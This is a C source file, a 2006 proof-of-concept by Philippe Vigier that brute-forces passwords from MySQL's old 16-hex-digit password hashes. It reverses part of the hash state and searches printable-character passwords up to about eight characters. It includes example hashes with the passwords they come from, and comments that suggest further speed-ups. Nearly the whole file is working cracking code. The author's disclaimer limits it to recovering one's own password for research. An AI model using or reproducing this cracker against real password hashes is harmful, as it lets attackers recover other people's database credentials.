/*
sqlhack Proof-of-Concept that crack "old" mysql passords fingerprints
Copyright (C) 2006 Philippe "iAPX" Vigier
 
This library is free software; you can redistribute it and/or
modify it under the terms of the GNU Lesser General Public
License as published by the Free Software Foundation; either
version 2.1 of the License, or (at your option) any later version.
 
This library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Lesser General Public License for more details.
 
You should have received a copy of the GNU Lesser General Public
License along with this library; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 
You could contact the author on this subject emailing to : poc ate sqlhack.com
*/
 
 
/*
  I apologize for the code-quality,
  I usually write better code, but it's just a Proof-of-concept, and I purposely remove certain optimizations,
  and use a one-hash algorithm instead the many-hashes algorithm (you'll easily write it by yourself if you wish).
 
  I also remove some kind of pattern (in fact this is chess-related a-priori sorting of the search space).
  But that shouldn't be a problem until you try to crack 9-character+ passwords!!!
 
  The main purpose is to be a Proof-of-concept, to mysql-password cracking, when using mysql internal hash function.
  NOBODY should never use it, and even the double SHA- is questionable, not because SHA-1 could be crack (it will be some day),
  but because of misuse and misconception of SHA-1 in MySQL : hashing a 78bits key (using 12 characters from ! to ~)
  with a 160bits hashing (and compression) algorithm (whatever is it), could lead to data pattern discovery.
 
  You will have to notice that the search_extension algorithm will fit nicely with a data-pattern algorithm,
  such as the ones found on Jack-the-ripper, to quickly find the last 3 characters if the first chars fit the password
  (or a password that share the same hashed fingerprint!)
 
  Permission was given to me on 2006, November 2nd, to publish paper and Proof-of-concept by Sergei Golubchik, 
  Senior software developper on MySQL AB.
 
  You should consider looking at both:
  - mysql documentation security pages
  - www.sqlhack.com security pages
 
  You should remember this Proof-of-concept is intended to be only this: a proof-of-concept, a research result.
  It is intended to retrieve your own password that you already know, to check vulnerabilities,
  it is not intended nor should it be used to crack real-world password.
*/
 
 
#include "stdlib.h"
#include "stdio.h"
#include "string.h"
 
 
#define xor ^
 
void search3_new( );
void search4_new( );
void search5_new( );
void search6_new( );
void search7_new( );
void search8_new( );
 
 
void get_old_nr2( );
void init_password( );
void found_footprint( );
int search_extension(unsigned long nrd, unsigned long nr2d, unsigned long add1d);
 
 
char footprint_str[32];
 
int len3=0, len4=0, len5=0, len6=0, len7=0, len8=0, len9=0, len10=0, lenall=1;
 
unsigned char char1, char2, char3, char4, char5, char6, char7, char8, char9, char10;
unsigned char extension_char1, extension_char2, extension_char3;
 
// Expected chars
unsigned long nr2_g2_expected1_genuine;
unsigned long nr2_g2_expected2_genuine;
unsigned long nr2_g3;
unsigned long nr2_g3plus;
unsigned long nr2_expected;
 
 
/// CODE SIMPLIFICATION
unsigned long footprint1;
unsigned long footprint2;
 
 
 
 
/*
  1234       -> 446a12100c856ce9
  12345	     -> 2e782c85379a326e
  123456     -> 565491d704013245
  1234567    -> 02c68e0207f5fd47
  12345678   -> 4448dd9a39ab97e1
*/
 
 
int hexdigit_value( char c ) {
  if( c>='0' && c<='9' ) return c-'0';
  if( c>='a' && c<='f' ) return c-'a'+10;
  if( c>='A' && c<='F' ) return c-'A'+10;   
 
  printf(" '%c' is not a valid hex digit\r\n", c);
  exit(0);
  return 0;
  }
 
 
int main( int argc, char **argv ) {
  int p;
 
 
printf("mysql crack POC (c) 2006 Philippe Vigier & www.sqlhack.com\r\n\n");
if( argc!=2 || (argc>=2 && strcmp(argv[1], "--help")==0 )  ) {
  printf("usage  : %s footprint\r\n", argv[0] );
  printf("example: %s 565491d704013245    (to retrieve the \"123456\" password in a second)\r\n", argv[0] );
  exit(0);
  }
 
 
// Comes from a version that enable multiple footprint search, but useless on a POC (and I removed the different algorithm!)
  {
  char * args = argv[1];
 
	if( strlen(args) != 16 ) { printf("arg '%s' is not a valid footprint (16-hex digits)\r\n", args ); exit(1); }
	// Take the footprint
	strcpy( footprint_str, args );
 
	// Convert it to 2 unsigned longs
	unsigned long f1=0, f2=0;
	int q;
	for( q=0; q<8; q++ ) {
	  f1 = (f1 << 4) + hexdigit_value( args[q] );
	  f2 = (f2 << 4) + hexdigit_value( args[q+8] );
	  }
 
    footprint1 = f1;
    footprint2 = f2;
    }
 
 
 
// Init the search
get_old_nr2();			// see thru the past of the hash
init_password();		// Empty the password
 
 
// Search itself
search3_new();
search4_new();
search5_new();
search6_new();
search7_new();
search8_new();
 
 
printf("More than 8-characters\r\n");
return(0);
}
 
 
void init_password(  ) {
  // Password initialization
  char1 = 0;
  char2 = 0;
  char3 = 0;
  char4 = 0;
  char5 = 0;
  char6 = 0;
  char7 = 0;
  char8 = 0;
  char9 = 0;
  char10 = 0;
 
}
 
 
void get_old_nr2( ) {
  unsigned long old_nr2_value;
  int old_nr2[8] ;
  int new_nr2[8] ;
  int new_nr[8];
  int carry[8] ;
 
  int p;
 
  for(p=0; p<8; p++) {
    old_nr2[p] = 0;
    new_nr2[p] = 0;
    new_nr[p] = 0;
    carry[p] = 0;
  }
 
 
  new_nr[1] = footprint1 & 255;
  new_nr[2] = (footprint1 >> 8 ) & 255;
  new_nr[3] = (footprint1 >> 16 ) & 255;
  new_nr[4] = (footprint1 >> 24 ) & 255;
 
  new_nr2[1] = footprint2 & 255;
  new_nr2[2] = (footprint2 >> 8 ) & 255;
  new_nr2[3] = (footprint2 >> 16 ) & 255;
  new_nr2[4] = (footprint2 >> 24 ) & 255;
 
 
  // Now we calculate seemslessly!
  for( p=1; p<=4; p++) {
    unsigned long tmp;
    tmp = old_nr2[p-1] ^ new_nr[p];
    old_nr2[p] = new_nr2[p] - carry[p] - tmp;
    if( old_nr2[p]< 0 ) {
      carry[p+1] = 1;
      old_nr2[p] += 256;
    }
  }
 
  // We construct the nr2 value after the character n-1 of the password
  old_nr2_value = (old_nr2[1] | (old_nr2[2]<<8) | (old_nr2[3]<<16) | (old_nr2[4]<<24) ) & 0x7FFFFFFF;
 
 
// We fill globale variables
   nr2_g2_expected1_genuine = old_nr2_value & 0x7FF00000;
   nr2_g2_expected2_genuine = (old_nr2_value - 0x100000) & 0x7FF00000;
   nr2_expected = old_nr2_value;
   nr2_g3 = nr2_g2_expected1_genuine & 0x70000000;
   nr2_g3plus = (nr2_g2_expected1_genuine + 0x10000000) & 0x70000000;
}
 
 
 
void found_footprint( ) {
  // Creates the password string Stores information, about found password
  char password[256], *ps;
  int p;
 
  ps = password;
 
 
  if( char1 ) *ps++ = char1;
  if( char2 ) *ps++ = char2;  
  if( char3 ) *ps++ = char3;  
  if( char4 ) *ps++ = char4;
  if( char5 ) *ps++ = char5;
  if( char6 ) *ps++ = char6;
  if( char7 ) *ps++ = char7;
 
  *ps++ = extension_char1;
  *ps++ = extension_char2;
  *ps++ = extension_char3;
 
  *ps = 0;			// Terminate the password string!!!
 
 
  // print information
  printf("password for footprint %s = '%s'\r\n", footprint_str, password );
  printf("\r\n");
  exit(0);
}
 
 
 
 
void search3_new( ) {
  unsigned long nr=1345345333L, add=7, nr2=0x12345671L;
 
  // Now we search
  if( search_extension( nr, nr2, add) ) return;
}
 
 
void search4_new( ) {
  unsigned long nr=1345345333L, add=7, nr2=0x12345671L;
 
  for(char1=33; char1<127; char1++) {
    // Init : on the first loop
    nr=1345345333L; 
    add=7; 
    nr2=0x12345671L;
 
    // And for this character
    nr^= (((nr & 63)+add)* (unsigned long)char1 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char1;
 
    // Now we search
    if( search_extension( nr, nr2, add) ) return;
  }
 
}
 
 
void search5_new( ) {
  unsigned long nr=1345345333L, add=7, nr2=0x12345671L;
 
  for(char1=33; char1<127; char1++) for( char2=33; char2<127; char2++) {
 
    // Init : on the first loop
    nr=1345345333L; 
    add=7; 
    nr2=0x12345671L;
 
    // And for this character 1
    nr^= (((nr & 63)+add)* (unsigned long)char1 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char1;
 
    // And for this character 2
    nr^= (((nr & 63)+add)* (unsigned long)char2 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char2;
 
    // Now we search
    if( search_extension( nr, nr2, add) ) return;
  }
 
}
 
 
 
 
void search6_new( ) {
  unsigned long nr=1345345333L, add=7, nr2=0x12345671L;
 
  for(char1=33; char1<127; char1++) for( char2=33; char2<127; char2++ ) for(char3=33; char3<127; char3++) {
    // Init : on the first loop
    nr=1345345333L; 
    add=7; 
    nr2=0x12345671L;
 
    // And character1
    nr^= (((nr & 63)+add)* (unsigned long)char1 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char1;
 
    // And character2
    nr^= (((nr & 63)+add)* (unsigned long)char2 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char2;
 
    // And character3
    nr^= (((nr & 63)+add)* (unsigned long)char3 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char3;
 
    // Now we search
    if( search_extension( nr, nr2, add) ) return;
  }
 
}
 
 
void search7_new( ) {
  unsigned long nr=1345345333L, add=7, nr2=0x12345671L;
 
  for(char1=33; char1<127; char1++) for( char2=33; char2<127; char2++ ) for(char3=33; char3<127; char3++) 
  for(char4=33; char4<127; char4++) {
    // Init : on the first loop
    nr=1345345333L; 
    add=7; 
    nr2=0x12345671L;
 
    // And character1
    nr^= (((nr & 63)+add)* (unsigned long)char1 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char1;
 
    // And character2
    nr^= (((nr & 63)+add)* (unsigned long)char2 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char2;
 
    // And character3
    nr^= (((nr & 63)+add)* (unsigned long)char3 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char3;
 
    // And character4
    nr^= (((nr & 63)+add)* (unsigned long)char4 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char4;
 
    // Now we search
    if( search_extension( nr, nr2, add) ) return;
  }
 
}
 
 
 
void search8_new( ) {
  unsigned long nr=1345345333L, add=7, nr2=0x12345671L;
 
  for(char1=33; char1<127; char1++) for( char2=33; char2<127; char2++ ) for(char3=33; char3<127; char3++) 
  for(char4=33; char4<127; char4++) for( char5=33; char5<127; char5++) {
    // Init : on the first loop
    nr=1345345333L; 
    add=7; 
    nr2=0x12345671L;
 
    // And character1
    nr^= (((nr & 63)+add)* (unsigned long)char1 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char1;
 
    // And character2
    nr^= (((nr & 63)+add)* (unsigned long)char2 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char2;
 
    // And character3
    nr^= (((nr & 63)+add)* (unsigned long)char3 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char3;
 
    // And character4
    nr^= (((nr & 63)+add)* (unsigned long)char4 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char4;
 
    // And character4
    nr^= (((nr & 63)+add)* (unsigned long)char5 )+ (nr << 8);
    nr2+=(nr2 << 8) ^ nr;
    add+=char5;
 
    // Now we search
    if( search_extension( nr, nr2, add) ) return;
  }
 
}
 
 
/**
 * This is where almost all intelligence fit
 * - get_old_nr2() let us to go to the past of the hash (and that's cool!)
 * - searchx_new are unoptimized versions, but it's useless to optimize it
 * 
 * Nota bene: you could envisage to add SSE2 128-bits integer optimization/assembly-code optimization on this code
 *            the extension_char1 loop is the best target for this kind of optimization (SSE2+loop unrolling)
 */
int search_extension(unsigned long nrd, unsigned long nr2d, unsigned long add1d) {
   unsigned long nre, nrf, nrg;
   unsigned long nr2e, nr2f, nr2g;
   unsigned long add1e, add1f, add1g;
 
   unsigned long constant1e, constant3e, variable1e;
   unsigned long constant1f, constant3f, variable1f;
   unsigned long constant1g, constant3g, variable1g;
 
   unsigned long nrdisc1, nrdisc2, nr2disc1, nr2disc2;
   unsigned long nr12;
   unsigned long delta1, delta2, delta3, delta4;
 
   unsigned long dividende1 , dividende2;
 
 
// 1-Internal variables
  constant1e = (nrd & 63) + add1d;
  constant3e = nr2d << 8;
  variable1e = (constant1e << 5) + (nrd << 8);
 
 
/* no-ply discrimination */
  nrdisc1 = nrd xor variable1e;
  nrdisc2 = nrdisc1 + 0x100000;
  nr2disc1 = nr2d + (constant3e xor nrdisc1);
  nr2disc2 = nr2d + (constant3e xor nrdisc2);
 
  nr12 = nrdisc1 << 8;
  delta1 = nrdisc1 xor (nr2disc1 << 8);
  delta2 = ((delta1 xor (nr12 + 0x10000000)) + nr2disc1) & 0x70000000;
  delta1 = ((delta1 xor nr12) + nr2disc1) & 0x70000000;
 
  nr12 = nrdisc2 << 8;
  delta3 = nrdisc2 xor (nr2disc2 << 8);
  delta4 = ((delta3 xor (nr12 + 0x10000000)) + nr2disc2) & 0x70000000;
  delta3 = ((delta3 xor nr12) + nr2disc2) & 0x70000000;
 
  if( delta1==nr2_g3 || delta2==nr2_g3 || delta3==nr2_g3 || delta4==nr2_g3 || 
      delta1==nr2_g3plus || delta2==nr2_g3plus || delta3==nr2_g3plus || delta4==nr2_g3plus )
		       // le brace{ n'est pas oublie ici !!! On rend la boucle conditionnelle
  for( extension_char1=33; extension_char1<=126; extension_char1++) {
    variable1e = variable1e + constant1e;
    nre = nrd xor variable1e;
    nr2e = nr2d + (constant3e xor nre);
 
 
// Should we continue further with these values, nr2(g-1) part from nr(g-2) et nr2(g-2) is it okay?
    nr12 = nre << 8;
    delta1 = nre xor (nr2e << 8);
    delta2 = ((delta1 xor (nr12 + 0x100000)) + nr2e) & 0x7FF00000;
    delta1 = ((delta1 xor nr12) + nr2e) & 0x7FF00000;
 
    if( delta1==nr2_g2_expected1_genuine || delta1==nr2_g2_expected2_genuine || 
        delta2==nr2_g2_expected1_genuine || delta2==nr2_g2_expected2_genuine ) {
 
      add1e = add1d + extension_char1;
 
      constant1f = (nre & 63) + add1e;
      constant3f = nr2e << 8;
      variable1f = (constant1f << 5 ) + (nre << 8);
 
 
      for( extension_char2=33; extension_char2<=126; extension_char2++) {
        variable1f = variable1f + constant1f;
        nrf = nre xor variable1f;
        nr2f = nr2e + (constant3f xor nrf);		   
 
 
// Is it worth to try?
        if( (nr2f & 0x7FFFFFFF)==nr2_expected ) {
 
          add1f = add1e + extension_char2;
          constant1g = (nrf & 63) + add1f;
          constant3g = nr2f << 8;
          variable1g = (constant1g << 5 ) + (nrf << 8);
 
            for( extension_char3=33; extension_char3<=126; extension_char3++) {
              variable1g = variable1g + constant1g;
              nrg = nrf xor variable1g;
              nr2g = nr2f + (constant3g xor nrg);
 
              if( (nrg & 0x7FFFFFFF)==footprint1 && (nr2g & 0x7FFFFFFF)==footprint2 ) { 
                found_footprint(); 
                return(1);
              }
            }
 
        }
      }
    }
  }
 
 return(0);
}

